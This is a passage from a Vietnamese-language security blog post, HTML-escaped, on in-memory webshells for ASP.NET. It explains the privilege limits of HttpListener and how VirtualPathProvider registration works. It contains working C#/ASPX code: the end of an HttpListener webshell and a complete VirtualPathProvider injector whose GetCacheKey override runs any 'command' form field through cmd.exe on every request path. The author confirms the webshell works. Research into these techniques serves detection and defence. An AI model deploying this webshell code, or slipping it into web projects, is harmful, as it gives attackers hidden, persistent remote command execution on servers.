&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;exit&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;listener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Stop&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Process&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Process&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FileName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;cmd.exe&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Arguments&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;/c&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UTF8&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StandardOutput&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadToEnd&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StandardError&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadToEnd&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StatusCode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ContentLength64&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;stm&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;OutputStream&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;stm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;CustomListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;http://localhost:5000/memshell/&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ngon luÃ´n:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HyK17KoBWl.png"
loading="lazy"
alt="image"
&gt;&lt;/p&gt;
&lt;h3 id="giá»›i-háº¡n"&gt;Giá»›i Háº¡n
&lt;/h3&gt;&lt;p&gt;CÃ¢u há»i Ä‘áº·t ra lÃ , mÃ¬nh cÃ³ Ä‘á» cáº­p Ä‘áº¿n viá»‡c ká»¹ thuáº­t cáº§n quyá»n System nhÆ°ng táº¡i Ä‘Ã¢y ngÆ°á»i dÃ¹ng thÃ´ng thÆ°á»ng váº«n cÃ³ thá»ƒ triá»ƒn khai Ä‘Æ°á»£c HttpListener Memory Webshell?&lt;br&gt;
Äá»ƒ cháº¡y má»™t HttpListerner báº¯t buá»™c pháº£i thÃªm Ä‘Æ°á»ng dáº«n Ä‘áº¿n HTTP Server thÃ´ng qua dÃ²ng lá»‡nh: HttpListener.Prefixes.Add, method nÃ y thá»±c cháº¥t gá»i Ä‘áº¿n HttpListener.AddPrefix, nÆ¡i sáº½ tiáº¿p tá»¥c gá»i Ä‘áº¿n HttpListener.InternalAddPrefix vÃ  cuá»‘i cÃ¹ng lÃ  HttpAddUrlToUrlGroup. ÄÃ¢y lÃ  method Ä‘Æ°á»£c import tá»« native dll httpapi.dll:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SJoo-Forbl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Vá» chá»©c nÄƒng, thÃ´ng tin cÅ©ng nhÆ° lÆ°u Ã½ cá»§a hÃ m nÃ y, Microsoft Ä‘Ã£ thÃ´ng bÃ¡o rÃµ ráº±ng tham sá»‘ pFullyQualifiedUrl chá»©a url truyá»n vÃ o náº¿u nhÆ° cÃ³ cá»•ng dá»‹ch vá»¥ nhá» hÆ¡n 1024 cáº§n quyá»n System Ä‘á»ƒ thá»±c thi, náº¿u khÃ´ng sáº½ dÃ­nh lá»—i Access Denied:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rkN5mYoBWg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tá»©c lÃ  trong trÆ°á»ng há»£p ngÆ°á»i dÃ¹ng web khÃ´ng cÃ³ quyá»n System, khÃ´ng thá»ƒ táº¡o Ä‘Æ°á»£c HTTP Server thÃ´ng qua HttpListener mÃ  cá»•ng dá»‹ch vá»¥ nhá» hÆ¡n 1024.&lt;br&gt;
NgoÃ i viá»‡c sá»­ dá»¥ng port tháº¥p ra, náº¿u nhÆ° muá»‘n khá»Ÿi táº¡o Server vá»›i IP khÃ´ng pháº£i localhost/127.0.0.1 mÃ  lÃ  IP cá»§a card máº¡ng wifi hoáº·c ethernet cÅ©ng cáº§n quyá»n System: Ä‘Ã¢y chÃ­nh lÃ  Ä‘iá»ƒm yáº¿u vÃ¬ trong mÃ´i trÆ°á»ng táº¥n cÃ´ng viá»‡c má»Ÿ server báº±ng IP local lÃ  vÃ´ nghÄ©a. VÃ­ dá»¥ nhÆ° á»Ÿ Ä‘Ã¢y Ä‘á»‹a chá»‰ IP card wifi cá»§a mÃ¬nh lÃ  192.168.100.198:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/Hy8ZNForWl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Náº¿u nhÆ° khá»Ÿi táº¡o HttpListener lÃ  http://192.168.100.198:5000/memshell/ sáº½ dÃ­nh lá»—i khÃ´ng cÃ³ quyá»n, do ngÆ°á»i dÃ¹ng deploy web Ä‘ang lÃ  user thÆ°á»ng:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/r1XmEtjS-x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
NgoÃ i ra, sá»­ dá»¥ng wildcard IP hoáº·c wildcard hostname nhÆ°: &lt;code&gt;http://*:8080/&lt;/code&gt;, &lt;code&gt;http://+:8080/&lt;/code&gt; cÅ©ng yÃªu cáº§u quyá»n System Ä‘á»ƒ thá»±c thi.&lt;/p&gt;
&lt;h2 id="virtualpath-memory-webshell"&gt;VirtualPath Memory Webshell
&lt;/h2&gt;&lt;p&gt;ÄÃ¢y lÃ  ká»¹ thuáº­t Ä‘Æ°á»£c sá»­ dá»¥ng phá»• biáº¿n nháº¥t khi explot .NET Memory Webshell, Ä‘Æ°á»£c sá»­ dá»¥ng lÃ m method táº¡o memshell trÃªn Godzilla: &lt;a class="link" href="https://github.com/A-D-Team/SharpMemshell/blob/main/VirtualPath/memshell.cs" target="_blank" rel="noopener"
&gt;https://github.com/A-D-Team/SharpMemshell/blob/main/VirtualPath/memshell.cs&lt;/a&gt;&lt;br&gt;
Äá»ƒ vÃ­ dá»¥ VirtualPathProvider trá»±c quan hÆ¡n thÃ¬ mÃ¬nh cÃ³ cÃ¡ch diá»…n giáº£i nhÆ° sau: ThÃ´ng thÆ°á»ng Ä‘á»ƒ truy cáº­p file aspx thÃ¬ trÃªn há»‡ thá»‘ng buá»™c pháº£i tá»“n táº¡i file tÆ°Æ¡ng á»©ng trong thÆ° má»¥c web váº­t lÃ½, cÃ²n VirtualPathProvider giÃºp lÆ°u trá»¯ file File.aspx á»Ÿ báº¥t cá»© Ä‘Ã¢u chá»© khÃ´ng nháº¥t thiáº¿t pháº£i tá»“n táº¡i trong há»‡ thá»‘ng file váº­t lÃ½ táº¡i server, cÃ³ thá»ƒ lÃ  lÆ°u trong database,&amp;hellip;
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/S1Y4CYoS-g.png"
loading="lazy"
alt="image"
&gt;&lt;/p&gt;
&lt;h3 id="not-so-memshell"&gt;Not so memshell
&lt;/h3&gt;&lt;p&gt;Tá»« khÃºc nÃ y mÃ¬nh sáº½ viáº¿t táº¯t VirtualPathProvider = VPP.&lt;br&gt;
Method RegisterVirtualPathProviderInternal chá»‹u trÃ¡ch nhiá»‡m thÃªm VPP má»›i vÃ o há»‡ thá»‘ng báº±ng cÃ¡ch lÆ°u Ä‘Æ°á»ng dáº«n áº£o truyá»n vÃ o &lt;code&gt;_virtualPathProvider&lt;/code&gt;, vÃ  Ä‘Æ°a VPP Ä‘Æ°á»£c Ä‘Äƒng kÃ½ trÆ°á»›c Ä‘Ã³ vÃ o method Initialize. NÆ¡i mÃ  VPP Ä‘Ã£ tá»“n táº¡i Ä‘Æ°á»£c Ä‘Æ°a vÃ o &lt;code&gt;_previous&lt;/code&gt;:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ByIw-6jB-x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/BkIc-TjBZe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tá»©c khi má»™t VPP má»›i Ä‘Æ°á»£c thÃªm vÃ o, VPP Ä‘Ã£ thÃªm trÆ°á»›c Ä‘Ã³ Ä‘Æ°á»£c coi nhÆ° má»™t node trÆ°á»›c vÃ  cÃ³ thá»ƒ truy cáº­p thÃ´ng qua thuá»™c tÃ­nh Previous. &lt;br&gt;
Khi má»™t request web page Ä‘áº¿n, á»©ng dá»¥ng xÃ©t láº§n lÆ°á»£t tá»« VirtualPath má»›i nháº¥t Ä‘áº¿n cÅ© nháº¥t cho Ä‘áº¿n khi trÃ¹ng khá»›p hoáº·c thuá»™c tÃ­nh previous lÃ  null thÃ¬ dá»«ng láº¡i. VÃ  &lt;code&gt;_virtualPathProvider&lt;/code&gt; tá»“n táº¡i Ä‘á»ƒ chá»©a giÃ¡ trá»‹ cá»§a node má»›i nháº¥t Ä‘Æ°á»£c thÃªm vÃ o. CÃ¡ch tá»• chá»©c vÃ  duyá»‡t pháº§n tá»­ nhÆ° nÃ y khÃ¡ giá»‘ng vá»›i má»™t danh sÃ¡ch liÃªn káº¿t Ä‘Æ¡n cÃ³ 1 con trá» head.
MÃ¬nh cÃ³ thá»ƒ Ä‘Äƒng kÃ½ 1 VPP vá»›i ná»™i dung tÃ¹y chá»‰nh báº±ng Ä‘oáº¡n mÃ£ sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;%
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;string base64 = &amp;#34;PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpTY3JpcHQiICU+DQo8JSBSZXNwb25zZS5Xcml0ZSgiVmlydHVhbFBhdGggQ3JlYXRlZCBTdWNjZXNzZnVsbHkiKTsgJT4=&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;string content = Encoding.UTF8.GetString(System.Convert.FromBase64String(base64));
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;string targetVirtualPath = &amp;#34;/TestPath.aspx&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;try{
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TestPathProvider testProvider = new TestPathProvider(targetVirtualPath, content);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HostingEnvironment.RegisterVirtualPathProvider(testProvider);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; testProvider.InitializeLifetimeService();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;catch (Exception error){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Console.WriteLine(error);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;%&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Trigger file nÃ y sáº½ táº¡o 1 VPP vá»›i Ä‘Æ°á»ng dáº«n &lt;code&gt;/TestPath.aspx&lt;/code&gt;, cÅ©ng cÃ³ thá»ƒ coi lÃ  má»™t fileless webshell:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/r1-IMTorWl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Äá»ƒ trá»Ÿ thÃ nh má»™t ká»¹ thuáº­t memshell Ä‘Ãºng nghÄ©a, mÃ¬nh muá»‘n exec command táº¡i Ä‘Æ°á»ng dáº«n báº¥t ká»³, cho nÃªn Ä‘oáº¡n code nÃ y lÃ  chÆ°a Ä‘á»§ Ä‘á»ƒ Ä‘Ã¡p á»©ng Ä‘iá»u kiá»‡n.&lt;/p&gt;
&lt;h3 id="virtualpath-at-its-finest"&gt;VirtualPath at its finest
&lt;/h3&gt;&lt;p&gt;Trong lÃºc debug thÃ¬ mÃ¬nh tháº¥y cÃ³ 2 method luÃ´n Ä‘Æ°á»£c gá»i khi truy cáº­p báº¥t ká»³ path nÃ o, Ä‘Ã³ lÃ  GetCacheKey vÃ  FileExists. NhÆ°ng khi ngÃ³ Ä‘oáº¡n code gen memshell cá»§a Godzilla, mÃ¬nh tháº¥y code memshell Ä‘Æ°á»£c truyá»n vÃ o method GetCacheKey. Äá»ƒ kiá»ƒm tra xem method nÃ o Ä‘Æ°á»£c call trÆ°á»›c, mÃ¬nh kiá»ƒm tra vá»›i 1 script Ä‘Æ¡n giáº£n:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public class TestPathProvider : VirtualPathProvider{
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public override string GetCacheKey(string virtualPath){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Console.WriteLine(&amp;#34;GetCacheKey called!!!&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return Previous.GetCacheKey(virtualPath);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public override bool FileExists(string virtualPath){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Console.WriteLine(&amp;#34;FileExists called!!!&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return Previous.FileExists(virtualPath);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;GetCacheKey Ä‘Æ°á»£c gá»i trÆ°á»›c, hiá»ƒu vÃ¬ sao nÃ³ Ä‘Æ°á»£c dÃ¹ng rá»“i ha ğŸ˜Š
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/Skb3XpoHZg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
MÃ¬nh craft láº¡i thÃ nh code gen VirtualPath memshell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;script runat=&amp;#34;server&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public class TestPathProvider : VirtualPathProvider{
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; public override string GetCacheKey(string virtualPath){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HttpContext context = HttpContext.Current;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; String cmd = context.Request.Form[&amp;#34;command&amp;#34;];
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (cmd != null){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HttpResponse response = context.Response;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Process p = new Process();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.StartInfo.FileName = &amp;#34;cmd.exe&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.StartInfo.Arguments = &amp;#34;/c&amp;#34; + cmd;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; p.Start();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; response.Write(System.Text.Encoding.Default.GetString(data));
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; response.End();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return Previous.GetCacheKey(virtualPath);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;%
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; TestPathProvider testProvider = new TestPathProvider();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; HostingEnvironment.RegisterVirtualPathProvider(testProvider);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; testProvider.InitializeLifetimeService();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Response.Write(&amp;#34;VirtualPath Memory Webshell injected!!!&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Response.End();
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;%&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Now we got the real memshell here:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rkFcVairWl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h2 id="httpmodule-memory-webshell"&gt;HTTPModule Memory Webshell
&lt;/h2&gt;&lt;p&gt;Äáº¿n vá»›i ká»¹ thuáº­t gáº§n Ä‘Ã¢y vÃ  phá»©c táº¡p nháº¥t, Ä‘Æ°á»£c team researcher cá»§a VCS cÃ´ng bá»‘ táº¡i buá»•i SecTalk vÃ o thÃ¡ng 5 nÄƒm 2025 khi tiáº¿n hÃ nh RedTeam vÃ o há»‡ thá»‘ng cÃ³ sá»­ dá»¥ng Microsoft Exchange.&lt;br&gt;
